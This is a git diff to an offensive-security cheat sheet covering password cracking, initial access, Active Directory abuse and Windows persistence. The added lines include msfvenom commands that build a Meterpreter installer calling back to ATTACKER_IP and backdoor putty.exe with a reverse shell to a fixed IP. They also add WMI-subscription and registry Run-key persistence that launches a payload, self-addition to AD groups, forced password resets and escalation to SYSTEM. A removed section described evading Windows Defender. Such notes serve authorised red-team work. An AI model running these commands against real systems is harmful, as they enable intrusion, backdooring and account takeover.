@@ -111,6 +111,13 @@ eyewitness --web -f domains.txt --threads 10
 </details>
 
 ## Password Attacks
+
+<details>
+<summary> cewl.rb </summary>
+
+Use CeWL to spider a target website and build a unique wordlist to use for cracking
+</details>
+
 <details>
 <summary> hydra </summary>
 
@@ -164,12 +171,21 @@ hash types can be found at: https://hashcat.net/wiki/doku.php?id=example_hashes
 
 useful hash modes (-m value):
 
+- 1000: NTLM
 - 5600: NTLMv2-SSP
 - 13100: Kerberos RC4 TGS Ticket (denoted by $krb5tgs$23$)
 
 </details>
 
 ## Initial Access
+Ports of interest
+
+- 22 - SSH
+- 135 - RPC
+- 139, 445 - SMB
+- 3389 - RDP
+- 5985, 5986 - WMI/WinRM
+
 <details>
 <summary> impacket </summary>
 
@@ -261,6 +277,9 @@ msfvenom --list formats
 
 # generate malicious installer file
 msfvenom -p windows/meterpreter/reverse_http lhost=ATTACKER_IP lport=8976 -f msi -o setup.msi
+
+# backdoor a legit exe. The binary will still work as usual but execute an additional payload silently.
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=10.209.28.34 lport=4444 -b "\x00" -f exe -o puttyX.exe
 ```
 </details>
 
@@ -459,15 +478,6 @@ https://github.com/klezVirus/chameleon
 ```
 </details>
 
-<details>
-<summary> Testing Windows Defender </summary>
-
-``` powershell
-# making modifications to a payload until it no longer triggers windows defender is another option. This tool will show the exact byte that triggered defender 
-DefenderCheck.exe payload.exe
-```
-</details>
-
 
 ## Situational Awareness
 <details>
@@ -650,7 +660,26 @@ rem enable CredSSP
 winrm set winrm/config/client/auth '@{CredSSP ="true"}'
 
 rem trust any host
-winrm set winrm/config/client/auth '@{TrustedHosts ="*"}'
+Set-Item WSMan:localhost\client\trustedhosts -value *
+```
+</details>
+
+<details>
+<summary> Permission Delegation </summary>
+
+``` powershell
+# if a compromised user account has "genericwrite" for a group (found using bloodhound), then they can add themselves to that group
+Add-ADGroupMember "IT Support" -Members "username"
+
+# verify that it worked 
+Get-ADGroupMember -Identity "IT Support"
+
+# force the DC sync
+gpupdate /force
+
+# if the compromised account has inherited the ForceChangePassword Permission Delegation, we can change a group member's password
+$Password = ConvertTo-SecureString "newpassword" -AsPlainText -Force 
+Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password 
 ```
 </details>
 
@@ -734,7 +763,7 @@ kerberos::tgt
 kerberos::list /export
 
 # on new system, load the stolen TGT ticket
-kerberos::ppt ticket.kirbi
+kerberos::ptt ticket.kirbi
 
 # now, in the same cmd prompt, you can authenticate to services as the compromised user
 psexec \\dc01 cmd.exe
@@ -746,6 +775,16 @@ psexec \\dc01 cmd.exe
 - add attacker ssh public key to authorized_keys file
 - create a scheduled task
 - create a WMI event consumer
+``` powershell
+# create an event filter (trigger called) "Updater" which looks for failed logins (event ID 4625) from "fakeuser"
+$filter = SetWmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = 'root/cimv2'; Name = "UPDATER"; Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '4625' AND TargetInstance.Message LIKE '$fakeuser%'"; QueryLanguage = 'WQL'}
+
+# setup the event consumer action (consumer)
+$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = "UPDATER"; CommandLineTemplate = "C:\payload.exe"}
+
+# setup the binding to look for the trigger and run the consumer
+$FilterToConsumerBunding = Set-WmiInstance -NameSpace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}
+```
 - add an executable/script to the windows startup folder
 - registry keys
 ``` bat
@@ -756,6 +795,9 @@ rem cmd autorun - when cmd loads, it looks for registry variables to execute fir
 HKCU\SOFTWARE\Microsoft\Command Processor\AutoRun
 rem HKCU Load - not used in modern windows but still supported
 HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
+
+rem example of adding a user registry key called "AppUpdateMon" which runs a malicious binary each time the user logs in
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "AppUpdateMon" /t REG_SZ /F /D "C:\payload.exe"
 ```
 
 
@@ -804,6 +846,10 @@ c:\windows\sysprep\sysprep.xml
 c:\windows\system32sysprep\Unattended.xml
 %WINDIR%\Panther\Unattend\Unattended.xml
 %WINDIR%\Panther\Unattended.xml
+```
+10. if administrator, escalate to SYSTEM
+``` bat
+psexec.exe -s cmd.exe
 ```
 </details>
 
